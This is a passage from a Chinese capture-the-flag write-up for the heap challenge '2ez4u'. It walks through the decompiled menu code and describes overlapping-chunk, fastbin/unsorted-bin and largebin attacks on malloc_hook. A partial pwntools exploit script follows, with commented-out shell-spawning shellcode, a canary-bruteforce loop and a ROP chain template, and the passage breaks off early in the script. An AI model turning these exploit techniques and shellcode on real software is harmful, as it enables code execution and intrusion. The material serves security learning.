            malloc_0();
            break;
          case 2u:
            free_0();
            break;
          case 3u:
            edit();
            break;
          case 4u:
            show_0();
            break;
          case 5u:
            exit(0);
            return;
          default:
            puts("invalid choice !");
            break;
        }
      }
    }
熟悉的菜单题，一个个看功能：
    malloc:
    unsigned __int64 malloc_0()
    {
      signed int i; // [rsp+4h] [rbp-2Ch]
      int v2; // [rsp+8h] [rbp-28h]
      unsigned int v3; // [rsp+Ch] [rbp-24h]
      unsigned int v4; // [rsp+10h] [rbp-20h]
      unsigned int size; // [rsp+14h] [rbp-1Ch]
      _QWORD *chunk; // [rsp+18h] [rbp-18h]
      unsigned __int64 v7; // [rsp+28h] [rbp-8h]
    ​
      v7 = __readfsqword(0x28u);
      if ( unk_202140 == 16 )//堆块个数最大16
      {
        puts("sorry XD");
      }
      else
      {
        printf("color?(0:red, 1:green):");
        v2 = read_0();
        if ( v2 != 1 && v2 )
        {
          puts("invalid");
        }
        else
        {
          printf("value?(0-999):");
          v3 = read_0();
          if ( v3 chunk1(0x20)--->chunk2(0x120)，free2，再free0，再free1，毫无疑问，下一次申请chunk4(0x90)和chunk5(0x50)还是切割chunk2，但是下标变成了0和1，而我们利用第一点，edit下我们的2号块，size是0x120，就可以实现任意写chunk4和chunk5。FD指针和BK指针都可以控制了。
接下来用2种方法做这道题：
第一种是fastbin attack+unsourtedbin attack：
第二种是largebin attack
第一种方法，泄露了地址后，利用unsorted
bin去攻击malloc_hook-0x50，从而在malloc_hook-0x40写入了main_arena+88真实地址，所以在malloc_hook-0x43处会有0x7f的size头可以构造fake_chunk，利用edit去写FD伪造，申请出来就是常规写onegadget的操作了。之所以这样就是因为写入description要隔开0x18的大小，所以之前malloc_hook-0x23的位置没有用了，得自己构造，这样写入的偏移还是0x13，这里直接上exp:
    #coding=utf8
    from pwn import *
    from libformatstr import FormatStr
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./2ez4u')
    if local:
        p = process('./2ez4u')
        libc = elf.libc
    else:
        p = remote('192.168.100.20',50005)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    #onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
    #onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
    # payload32 = fmtstr_payload(offset ，{xxx_got:system_addr})
    # f = FormatStr(isx64=1)
    # f[0x8048260]=0x45372800
    # f[0x8048260+4]=0x7f20
    # f.payload(7)
    #shellcode = asm(shellcraft.sh())
    #shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
    #shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
    #shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    ​
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    # i = 0
    # while True:
    #     i += 1
    #     print i
    #     if local:
    #         p = process('./babypie')
    #         libc = elf.libc
    #     else:
    #         p = remote('',)
    #         libc = ELF('./')
    #     sl = lambda s : p.sendline(s)
    #     sd = lambda s : p.send(s)
    #     rc = lambda n : p.recv(n)
    #     ru = lambda s : p.recvuntil(s)
    #     ti = lambda : p.interactive()
    #     system_addr = '\x3E\x0A'
    #     py = ''
    #     py += 'a'*0x28 +'\x01'
    #     sd(py)
    #     ru('\x01')
    #     canary = '\x00' + p.recv()[:7]
    #     print "canary--->" + hex(u64(canary))
    #     py = ''
    #     py += 'a'*0x28 + canary + 'aaaaaaaa' + system_addr
    #     sd(py)
    #     try:
    #         p.recv(timeout = 1)
    #     except EOFError:
    #         p.close()
    #         continue
    #     p.interactive()
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    ​
    # def mid_overflow(offset,func_got,rdi,rsi,rdx,next_func):
    #   payload = ''
    #   payload += 'a'*offset
    #   payload += 'aaaaaaaa'
    #   payload += p64(pppppp_ret)
    #   payload += p64(0)
    #   payload += p64(0)
    #   payload += p64(1)
    #   payload += p64(func_got)
    #   payload += p64(rdx)
    #   payload += p64(rsi)
    #   payload += p64(rdi)
    #   payload += p64(mov_ret)
    #   payload += p64(0)
    #   payload += p64(0)
    #   payload += p64(0)
    #   payload += p64(0)
    #   payload += p64(0)
    #   payload += p64(0)
    #   payload += p64(0)
    #   payload += p64(next_func)
    #   ru('Input:\n')
    #   sd(payload)
    def malloc(color,value,num,size,content):
        ru("your choice: ")
        sl('1')
        ru("color?(0:red, 1:green):")
        sl(str(color))
        ru("value?(0-999):")
        sl(str(value))
        ru("num?(0-16):")
        sl(str(num))
        ru("description length?(1-1024):")
        sl(str(size))
        ru("description of the apple:")
        sl(content)
    def free(index):
        ru("your choice: ")
        sl('2')
        ru("which?(0-15):")
        sl(str(index))
    def edit(index,color,value,num,content):
        ru("your choice: ")
        sl('3')
        ru("which?(0-15):")
        sl(str(index))
        ru("color?(0:red, 1:green):")
        sl(str(color))
        ru("value?(0-999):")
        sl(str(value))
        ru("num?(0-16):")
        sl(str(num))
        ru("new description of the apple:")
        sl(content)
    def show(index):
        ru("your choice: ")
        sl('4')
        ru("which?(0-15):")
        sl(str(index))
    ​
    malloc(0,0x100,0,0x68,'aaaa')#0
    malloc(0,0x100,0,0x68,'bbbb')#1
    malloc(0,0x100,0,0x68,'cccc')#2
    # debug(0)
    free(0)